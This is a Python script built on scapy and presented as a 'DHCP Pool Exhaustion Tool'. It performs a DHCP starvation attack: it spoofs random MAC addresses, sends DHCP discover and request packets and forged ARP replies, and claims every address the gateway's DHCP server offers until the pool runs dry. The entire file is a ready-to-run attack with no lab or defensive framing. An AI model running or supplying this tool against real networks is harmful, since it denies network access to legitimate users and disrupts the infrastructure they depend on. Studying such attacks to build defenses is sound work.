#!/usr/bin/env python3
"""
DHCP Pool Exhaustion Tool
"""

import netifaces
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP


def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None


def get_default_interface():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][1]
    return conf.iface


def send_discover(fake_mac, iface):
    """
    Broadcast DHCP discover with spoofed MAC
    """
    dest_ip = '255.255.255.255'
    dest_mac = "ff:ff:ff:ff:ff:ff"
    pkt = Ether(src=mac2str(fake_mac), dst=dest_mac, type=0x0800)
    pkt /= IP(src='0.0.0.0', dst=dest_ip)
    pkt /= UDP(sport=68, dport=67)
    pkt /= BOOTP(chaddr=mac2str(fake_mac),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF)
    pkt /= DHCP(options=[("message-type", "discover"),
                         "end"])
    sendp(pkt, iface=iface)
    print("discover sent")


def send_request(wanted_ip, fake_mac, srv_ip, iface):
    """
    Send DHCP request for specific IP with spoofed MAC
    """
    dest_ip = '255.255.255.255'
    dest_mac = "ff:ff:ff:ff:ff:ff"
    pkt = Ether(src=mac2str(fake_mac), dst=dest_mac)
    pkt /= IP(src="0.0.0.0", dst=dest_ip)
    pkt /= UDP(sport=68, dport=67)
    pkt /= BOOTP(chaddr=mac2str(fake_mac),
                 xid=random.randint(1, 1000000000))
    pkt /= DHCP(
        options=[("message-type", "request"),
                 ("server_id", srv_ip),
                 ("requested_addr", wanted_ip),
                 "end"])
    sendp(pkt, iface=iface)
    print('request sent')


def send_arp(claimed_ip, fake_mac, srv_ip, srv_mac, iface):
    """Send ARP reply to announce presence"""
    pkt = ARP(op=2, hwsrc=mac2str(fake_mac), psrc=claimed_ip, hwdst=srv_mac, pdst=srv_ip)
    send(pkt, iface=iface)


def exhaust_dhcp():
    """
    Main function - exhausts DHCP pool using auto-detected gateway
    """
    # Auto-detect network config
    target = get_gateway_ip()
    iface = get_default_interface()
    
    if not target:
        print("[!] Could not detect gateway. Exiting.")
        return
    
    print(f"[*] Gateway detected: {target}")
    print(f"[*] Interface: {iface}")
    print("[*] Starting DHCP exhaustion...\n")
    
    captured = []
    current_src = 0
    
    # Get server MAC
    srv_mac = sr1(ARP(op=1, pdst=str(target)), timeout=2, verbose=0)
    if srv_mac:
        srv_mac = srv_mac[ARP].hwsrc
    else:
        print("[!] Could not resolve gateway MAC. Exiting.")
        return
    
    while True:
        attempts = 0
        hw = RandMAC()
        # Send discover
        send_discover(fake_mac=hw, iface=iface)
        
        while True:
            # Sniff for response with timeout
            response = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
            
            if not len(response):
                if attempts >= 3:
                    # No answer after 3 tries - pool exhausted
                    print("\n[*] Attack finished - pool exhausted")
                    print(f"[*] Total IPs captured: {len(captured)}")
                    for entry in captured:
                        print(f"    {entry['ip']} -> {entry['mac']}")
                    return
                attempts += 1
                print(f"retrying ({attempts}/3)")
                send_discover(fake_mac=hw, iface=iface)
                continue
            
            # Check if DHCP offer from target server
            if DHCP in response[0]:
                if response[0][DHCP].options[0][1] == 2:  # OFFER
                    offered_ip = response[0][BOOTP].yiaddr
                    from_ip = response[0][IP].src
                    
                    if not target and not from_ip == current_src:
                        current_src = from_ip
                        srv_mac = sr1(ARP(op=1, pdst=str(from_ip)), timeout=2, verbose=0)[ARP].hwsrc
                    
                    if from_ip == target or not target:
                        break
                    continue
        
        # Send request and ARP
        send_request(wanted_ip=str(offered_ip), fake_mac=hw, srv_ip=str(target), iface=iface)
        send_arp(claimed_ip=str(offered_ip), fake_mac=hw, srv_ip=str(target), srv_mac=srv_mac, iface=iface)
        
        # Log captured IP
        captured.append({'ip': str(offered_ip), 'mac': str(hw)})
        print(f"\n[+] CAPTURED: {offered_ip} -> {hw}")
        print(f"[*] Total: {len(captured)}\n")


if __name__ == "__main__":

    argparse = argparse.ArgumentParser(description="DHCP Pool Exhaustion Tool")
    argparse.add_argument('-i', '--iface', metavar="IFACE", default=get_default_interface(), type=str,
                          help='Network interface to use')
    args = argparse.parse_args()

    conf.iface = args.iface
    
    print("=" * 50)
    print("   DHCP Pool Exhaustion")
    print("=" * 50)
    exhaust_dhcp()
